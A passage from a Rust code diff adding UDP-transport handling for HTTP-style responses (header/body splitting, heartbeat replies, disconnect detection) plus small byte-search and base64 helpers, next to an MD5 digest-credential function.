+                    }
+                }
+
+                if let Some(len) = content_len {
+                    if buf.len() >= body_offset + len {
+                        let headers = String::from_utf8_lossy(&buf[..body_offset - 4]).into_owned();
+                        return Some((headers, buf[body_offset..].to_vec()));
+                    }
+                }
+            }
+            PTCPBody::Heartbeat => {
+                let mut s = pcp_session.lock().await;
+                udp_send(sock, &s.send(PTCPBody::Heartbeat).serialize()).await;
+                continue;
+            }
+            PTCPBody::Empty => {
+                let mut s = pcp_session.lock().await;
+                udp_send(sock, &s.send(PTCPBody::Empty).serialize()).await;
+                continue;
+            }
+            PTCPBody::Status(r, s) if *r == realm_id && s == "DISC" => {
+                LAST_CALL_DISC.store(true, Ordering::Relaxed);
+                break;
+            }
+            _ => continue,
+        }
+    }
+
+    if buf.is_empty() {
+        None
+    } else if have_headers {
+        let headers_count = buf.len();
+        let body = buf[body_offset.min(headers_count)..].to_vec();
+        let headers = String::from_utf8_lossy(&buf[..body_offset.min(headers_count)]).into_owned();
+        Some((headers, body))
+    } else {
+        let headers = String::from(&String::new());
+        Some((headers, buf))
+    }
+}
+
+fn find_bytes(haystack: &[u8], needle: &[u8]) -> Option<usize> {
+    if needle.is_empty() {
+        return None;
+    }
+    haystack.windows(needle.len()).position(|w| w == needle)
+}
+
+fn base64_encode_basic(input: &str) -> String {
+    use base64::Engine;
+    base64::engine::general_purpose::STANDARD.encode(input.as_bytes())
 }
 
 /// Extract JSON body from HTTP response (after \r\n\r\n).
@@ -1750,5 +2063,3 @@ pub fn http_adduser_password_hash(user: &str, realm: &str, password: &str) -> St
         md5::compute(format!("{}:{}:{}", user, realm, password).as_bytes())
     )
 }
-
-
